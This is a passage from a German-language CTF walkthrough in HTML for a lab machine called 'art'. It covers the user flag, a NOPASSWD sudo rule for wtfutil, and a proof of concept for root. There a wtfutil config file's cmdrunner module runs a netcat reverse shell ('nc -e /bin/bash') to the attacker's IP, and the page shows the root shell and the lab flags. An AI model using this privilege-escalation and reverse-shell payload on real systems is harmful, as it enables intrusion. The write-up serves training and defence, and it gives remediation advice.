+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Das Home-Verzeichnis `/home/lion` existiert und enthält die Datei `user.txt`. Der Befehl `cat user.txt` liest die Flag erfolgreich aus: `<span class="password">HMVygUmTyvRPWduINKYfmpO</span>`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Setzen Sie die Enumeration fort, um Root-Rechte zu erlangen. Der nächste Schritt ist `sudo -l`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Die User-Flag ist ein CTF-Element. In realen Systemen sollten sensible Daten im Home-Verzeichnis angemessen geschützt sein.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">ls /home/</span></div>
+                     <pre>lion</pre>
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMVygUmTyvRPWduINKYfmpO</span></pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="privesc-root">
+             <h2>Privilege Escalation (lion -> root)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen des Benutzers `lion` zu überprüfen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Ein sehr vielversprechender Fund! `lion` darf den Befehl `/bin/wtfutil` als jeder Benutzer (`ALL`) und jede Gruppe (`ALL`) ohne Passwort (`NOPASSWD:`) ausführen: `(ALL : ALL) NOPASSWD: /bin/wtfutil`. `wtfutil` ist ein Dashboard-Tool für das Terminal. Wenn ein Benutzer ein beliebiges Programm über `sudo` ohne Passwort als `root` ausführen kann, ist dies fast immer ein direkter Weg zur Root-Shell. Es muss nur herausgefunden werden, wie `wtfutil` zur Befehlsausführung missbraucht werden kann.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach Möglichkeiten, mit `wtfutil` Befehle auszuführen oder eine Shell zu starten (z.B. über Konfigurationsdateien, Module, interne Befehle). GTFOBins ist eine gute Quelle für solche Informationen. Führen Sie `sudo /bin/wtfutil -h` aus, um die Hilfe und Optionen anzuzeigen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Diese `sudo`-Regel ist extrem gefährlich und sollte sofort entfernt werden. Es ist fast nie sicher, einem normalen Benutzer zu erlauben, ein komplexes Anwendungsprogramm als `root` ohne Passwort auszuführen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for lion on art:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User lion may run the following commands on art:
+    (ALL : ALL) NOPASSWD: /bin/wtfutil
+                     </pre>
+                     <!-- Erste Ausführung von wtfutil (Standard) -->
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">sudo -u root /bin/wtfutil</span></div>
+                     <pre>
+
+	      ____    __    ____ .___________. _______
+	      \   \  /  \  /   / |           ||   ____|
+	       \   \/    \/   /  ----|  |-----|  |__
+	        \            /       |  |     |   __|
+	         \    /\    /        |  |     |  |
+	          \__/  \__/         |__|     |__|
+
+    the personal information dashboard for your terminal
+
+    The development and maintenance of WTF is supported by sponsorships.
+    Sponsor the development of WTF at https://github.com/sponsors/senorprogrammer
+
+                     </pre>
+                     <!-- Hilfe anzeigen -->
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">sudo -u root /bin/wtfutil -h</span></div>
+                     <pre>
+Usage:
+  wtfutil [OPTIONS] [command] [args...]
+
+Application Options:
+  -c, --config=  Path to config file
+  -m, --module=  Display info about a specific module, i.e.: 'wtfutil -m=todo'
+  -p, --profile  Profile application memory usage
+  -v, --version  Show version info
+
+Help Options:
+  -h, --help     Show this help message
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (lion -> root via wtfutil config)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept beschreibt, wie die `sudo`-Berechtigung für `/bin/wtfutil` ausgenutzt wird, um Root-Rechte zu erlangen. `wtfutil` erlaubt das Laden einer benutzerdefinierten Konfigurationsdatei (`-c`). Innerhalb dieser Konfiguration können über das Modul `cmdrunner` beliebige Shell-Befehle definiert werden, die dann beim Start von `wtfutil` ausgeführt werden. Da `wtfutil` via `sudo` als `root` gestartet wird, werden auch die Befehle im `cmdrunner`-Modul als `root` ausgeführt.
+             </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                *   Zugriff als Benutzer `lion`.
+                *   Die `sudo`-Regel `(ALL : ALL) NOPASSWD: /bin/wtfutil` muss aktiv sein.
+                *   Die Möglichkeit, eine Konfigurationsdatei im Home-Verzeichnis von `lion` zu erstellen.
+                *   Ein Listener (`netcat`) auf dem Angreifer-System (IP `192.168.2.153`, Port `443`).
+            </p>
+
+            <p class="analysis">
+                <strong>Schritt 1: Erstellen der bösartigen Konfigurationsdatei</strong><br>
+                1.  `nano config.yml`: Eine neue Datei `config.yml` wird im Home-Verzeichnis von `lion` erstellt.
+                2.  Folgender Inhalt wird eingefügt:
+                    ```yaml
+                    wtf:
+                      grid:
+                        columns: [40, 40]
+                        rows: [4, 4]
+                      refreshInterval: 1
+                      mods:
+                        disks: # Name des Moduls ist beliebig
+                          type: cmdrunner # Wichtig: Modul zum Ausführen von Befehlen
+                          cmd: "nc" # Der auszuführende Befehl
+                          args: ["-e", "/bin/bash", "192.168.2.153", "443"] # Argumente für nc (Reverse Shell)
+                          enabled: true
+                          position: # Position im Dashboard (irrelevant für Exploit)
+                            top: 3
+                            left: 1
+                            height: 1
+                            width: 3
+                          refreshInterval: 3 # Intervall (irrelevant für Exploit)
+                    ```
+                    Dieser Code definiert ein `cmdrunner`-Modul, das `nc -e /bin/bash [Angreifer-IP] [Port]` ausführt, also eine Reverse Shell startet.
+                3.  `chmod +x config.yml`: Die Datei wird ausführbar gemacht (obwohl dies für eine Konfigurationsdatei normalerweise nicht nötig ist, schadet es hier nicht).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 1):</strong> Die Konfigurationsdatei ist korrekt erstellt und enthält die Reverse-Shell-Payload im `cmdrunner`-Modul.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die IP-Adresse und der Port in den `args` korrekt sind und zum Listener passen. Starten Sie den Listener auf dem Angreifer-System.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Möglichkeit, über eine Konfigurationsdatei beliebige Befehle in einem mit `sudo` ausgeführten Programm zu starten, ist eine klare Schwachstelle. Die `sudo`-Regel für `wtfutil` muss entfernt werden. Untersuchen Sie, ob `wtfutil` sicher konfiguriert werden kann, um das Laden von Konfigurationsdateien aus nicht vertrauenswürdigen Pfaden zu verhindern, wenn es als `root` läuft (unwahrscheinlich).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">nano config.yml</span></div>
+                     <!-- Inhalt wird wie oben beschrieben eingefügt und gespeichert -->
+                     <pre>
+# Inhalt von config.yml:
+wtf:
+  grid:
+    columns: [40, 40]
+    rows: [4, 4]
+  refreshInterval: 1
+  mods:
+    disks:
+      type: cmdrunner
+      cmd: "nc"
+      args: ["-e", "/bin/bash", "192.168.2.153", "443"]
+      enabled: true
+      position:
+        top: 3
+        left: 1
+        height: 1
+        width: 3
+      refreshInterval: 3
+                     </pre>
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">chmod +x config.yml</span></div>
+                 </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Schritt 2: Listener starten und Exploit ausführen</strong><br>
+                1.  `nc -lvnp 443`: Auf dem Angreifer-System wird der `netcat`-Listener auf Port 443 gestartet.
+                2.  `sudo -u root /bin/wtfutil --config=/home/lion/config.yml`: Auf dem Zielsystem führt `lion` `wtfutil` über `sudo` als `root` aus und gibt mittels `-c` (oder `--config=`) die gerade erstellte bösartige Konfigurationsdatei an.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Schritt 2):</strong> `wtfutil` startet als `root`, lädt die `config.yml`, findet das `cmdrunner`-Modul und führt den darin definierten `nc`-Befehl aus. Die Reverse Shell verbindet sich erfolgreich zum Listener des Angreifers. Der Befehl `id` im Listener bestätigt `uid=0(root)`. Root-Zugriff wurde erlangt!
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht! Sichern Sie die Root-Flag und dokumentieren Sie den Vorgang.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** System kompromittiert. Notfallplan aktivieren. Unsichere `sudo`-Regel für `wtfutil` entfernen. System bereinigen.
+            </p>
+             <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Die Kette aus SQL-Injection (zum Erlangen von Bildnamen und Klartextpasswörtern), Steganographie (zum Finden der korrekten Zugangsdaten) und einer unsicheren `sudo`-Regel für ein Tool, das Befehlsausführung über Konfigurationsdateien erlaubt, führte zur vollständigen Kompromittierung. Das Risiko ist **kritisch**.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System (Kali) -->
+                     <div class="prompt">┌──(root㉿cyber)-[/media/sf_Kali_2022_Files]
+└─# <span class="command">nc -lvnp 443</span></div>
+                     <pre>listening on [any] 443 ...</pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Zielsystem (als lion) -->
+                     <div class="prompt no-kali-prompt">lion@art:~$ <span class="command">sudo -u root /bin/wtfutil --config=/home/lion/config.yml</span></div>
+                     <!-- wtfutil Startbildschirm wird angezeigt, während im Hintergrund die Shell gestartet wird -->
+                     <pre>
+
+	      ____    __    ____ .___________. _______
+	      \   \  /  \  /   / |           ||   ____|
+	       \   \/    \/   /  ----|  |-----|  |__
+	        \            /       |  |     |   __|
+	         \    /\    /        |  |     |  |
+	          \__/  \__/         |__|     |__|
+
+    the personal information dashboard for your terminal
+
+    The development and maintenance of WTF is supported by sponsorships.
+    Sponsor the development of WTF at https://github.com/sponsors/senorprogrammer
+
+                     </pre>
+                     <!-- (Keine weitere Ausgabe in dieser Shell, Prozess läuft) -->
+                 </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System (Kali): Eingehende Verbindung -->
+                     <pre>
+connect to [192.168.2.153] from (UNKNOWN) [192.168.2.113] 53444
+                     </pre>
+                     <!-- Befehle in der empfangenen Root-Shell -->
+                     <div class="prompt root-prompt"># <span class="command">id</span></div>
+                     <pre>uid=0(root) gid=0(root) groups=0(root)</pre>
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Nachdem Root-Zugriff erlangt wurde, werden die User- und Root-Flags gesucht und ausgelesen. Die User-Flag wurde bereits als `lion` gefunden. Die Root-Flag wird durch Suchen nach `.txt`-Dateien im Besitz von `root` gefunden (`/var/opt/root.txt`) und dann ausgelesen.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert. Die Root-Flag befand sich an einem ungewöhnlichen Ort (`/var/opt/`), was die Wichtigkeit einer gründlichen Suche unterstreicht.
+                 </p>
+                 <div class="code-block">
+                      <div class="terminal">
+                          <!-- Befehle in der Root-Shell -->
+                          <div class="prompt root-prompt"># <span class="command">cd /root</span></div>
+                          <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                          <pre>.bash_history  .bashrc  .config  .local  .mysql_history  .profile  .ssh  .wget-hsts</pre>
+                          <div class="prompt root-prompt"># <span class="command">ls -lah</span></div>
+                          <pre>
+total 40K
+drwx------  5 root root 4.0K Oct 27 00:58 .
+drwxr-xr-x 18 root root 4.0K Aug  3 10:52 ..
+lrwxrwxrwx  1 root root    9 Aug  3 11:07 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4.0K Oct 27 00:58 .config
+drwxr-xr-x  3 root root 4.0K Aug  3 11:12 .local
+-rw-------  1 root root 2.0K Aug  3 11:12 .mysql_history
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwx------  2 root root 4.0K Aug  3 11:15 .ssh
+-rw-r--r--  1 root root  165 Aug  3 11:15 .wget-hsts
+                          </pre>
+                          <div class="prompt root-prompt"># <span class="command">find / -user root -name \*.txt 2>/dev/null</span></div>
+                          <pre>
+/usr/lib/python3.9/LICENSE.txt
+/usr/share/doc/gawk/examples/network/stoxdata.txt
+/usr/share/mysql/errmsg-utf8.txt
+/var/cache/dictionaries-common/ispell-dicts-list.txt
+/var/opt/root.txt
+                          </pre>
+                          <div class="prompt root-prompt"># <span class="command">cat /var/opt/root.txt</span></div>
+                          <pre><span class="password">mZxbPCjEQYOqkNCuyIuTHMV</span></pre>
+                          <div class="prompt root-prompt"># <span class="command">cat /home/lion/user.txt</span></div>
+                          <pre><span class="password">HMVygUmTyvRPWduINKYfmpO</span></pre>
+                      </div>
+                  </div>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/lion/user.txt</div>
+                     <div class="flag-value"><span class="password">HMVygUmTyvRPWduINKYfmpO</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /var/opt/root.txt</div>
+                     <div class="flag-value"><span class="password">mZxbPCjEQYOqkNCuyIuTHMV</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-10-27</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html> 
